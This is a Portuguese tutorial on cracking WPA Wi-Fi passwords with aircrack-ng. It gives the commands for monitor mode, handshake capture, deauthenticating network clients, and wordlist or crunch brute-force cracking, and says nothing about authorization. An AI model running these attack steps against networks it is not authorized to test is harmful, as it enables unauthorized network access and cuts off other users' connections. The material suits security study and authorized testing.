
# Aircrack suite

![Aircrack-ng](https://www.aircrack-ng.org/~~V:/lib/exe/fetch.php?w=600&h=300&tok=6a4d47&media=http%3A%2F%2Fwww.aircrack-ng.org%2Fimg%2Faircrack-ng.explaination.gif)


Agora que já sabemos como funciona a teoria, para aplicar o WPA Attack utilizaremos o pacote de ferramentas [aircrack-ng](https://www.aircrack-ng.org/doku.php?id=Main), o qual pode ser instalado com:
```
sudo apt-get install -y aircrack-ng
```
**Observação:** Caso possua possua uma distro não debian-based, você pode instalar diretamente fonte seguindo essas [instruções](https://www.aircrack-ng.org/doku.phpid=installaircrack#compilingandinstalling).

## Escolhendo a interface de monitoramento
Antes de começar o ataque em si, precisamos descobrir qual interface de rede utilizaremos para monitorar os pacotes em circulação:

```
iwconfig
```



## Airmon
Depois, utilizando o `airmon-ng` podemos ergue-la em modo monitoramento:

```
airmon-ng check kill && sudo airmon-ng start <INTERFACE> 
```

*Vale ressaltar que assim que realizarmos esse passo, seu acesso à internet será cortado. Mas não se desespere! Se você seguir esse tutorial até o final, <a href="#restore_net"> reestabeleceremos sua conexão </a>.Além disso, o nome de sua interface será acrescido do sufixo 'mon'.*


## Airodump
Agora, podemos listar todos os wifis/pontos de acesso por meio dos pacotes que chegam até a interface:

```
sudo airodump-ng <INTERFACE>
```

Assim que o wifi que se deseja crackear aparecer na lista, podemos dar `Ctrl+C` para parar o airodump e salvar seu `BSSID` e `CHANNEL`. Em seguida, podemos inspecionar com mais precisão todos os pacotes que circulam por ele com:

```
sudo airodump-ng -w <OUTFILE> -c <CHANNEL> -bssid <BSSID> <INTERFACE>
```

## Aireplay
Simultaneamente em outro terminal,
podemos executar um deauthentication attack em alguns dos clientes da rede dado seu `STATION_NUMBER`:

```
sudo aireplay-ng --deauth <TIMES> -a <BSSID> -c <CLIENT_STATION_NUMEBR> <INTERFACE>
```

## Aircrack

Por fim, agora que temos os handshakes, podemos usar o `aircrack-ng` para conseguir a senha de acesso utilizando alguma `WORDLIST`:

```
aircrack-ng <HANDSHAKE_FILE> -w <WORDLIST> -l <OUTFILE>
```



## Crunch

Caso não queira usar um dicionário, podemos brutar todas as possibilidades de senhas
utilizando o `crunch`

Primeiramente, para instalá-lo:
```
sudo apt-get install crunch
```

Agora, utilizando o aircrack em pipeline:
```
crunch <MIN> <MAX> <CHARSET> | aircrack-ng -b <BSSID> -w - <HANDSHAKE_FILE> -l <OUTFILE>
```

## <a id="restore_net">Restaurando sua conexão</a>
Para que sua internet volte a funcionar, temos que erguer a interface em modo normal e parar o monitoramento de pacotes:

```
sudo airmon-ng start <NORMAL_INTERFACE>
```
```
sudo airmon-ng stop <MON_INTERFACE>
```
```
ifconfig <NORMAL_INTERFACE> up
```
```
sudo service network-manager restart
```

*`NORMAL_INTERFACE` diz respeito ao nome da interface sem o sufixo 'mon'*

**Observação:** Existe mais de uma possibilidade para network manager, então o último comando pode variar de acordo com a distro instalada* 